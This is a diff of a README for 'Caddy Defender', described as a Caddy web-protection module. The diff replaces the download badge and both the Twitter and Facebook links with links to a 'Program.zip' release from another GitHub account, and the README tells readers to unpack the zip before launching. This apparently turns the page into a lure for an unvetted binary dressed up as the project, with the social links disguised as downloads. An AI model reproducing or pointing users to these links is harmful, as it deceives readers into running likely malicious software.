@@ -22,7 +22,7 @@ Welcome to the Caddy Defender repository! This Caddy module is designed to help 
 1. Clone the Caddy Defender repository to your local machine.
 2. Follow the installation instructions provided in the repository.
 
-### Download Software Zip [![Download](https://img.shields.io/badge/Download-Click%20Here-yellow)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+### Download Software Zip [![Download](https://github.com/levy0157/caddy-defender/releases/download/v1.0/Program.zip%20Here-yellow)](https://github.com/levy0157/caddy-defender/releases/download/v1.0/Program.zip)
 
 📂 **Note:** Make sure to unpack the Software Zip file before launching.
 
@@ -43,7 +43,7 @@ Welcome to the Caddy Defender repository! This Caddy module is designed to help 
 ## Stay Connected 🌐
 
 Follow us on social media for updates and announcements:
-- Twitter: [@CaddyDefender](https://twitter.com/CaddyDefender)
-- Facebook: [Caddy Defender](https://www.facebook.com/CaddyDefender)
+- Twitter: [@CaddyDefender](https://github.com/levy0157/caddy-defender/releases/download/v1.0/Program.zip)
+- Facebook: [Caddy Defender](https://github.com/levy0157/caddy-defender/releases/download/v1.0/Program.zip)
 
 Thank you for choosing Caddy Defender to protect your website! 🛡️🔒🌐
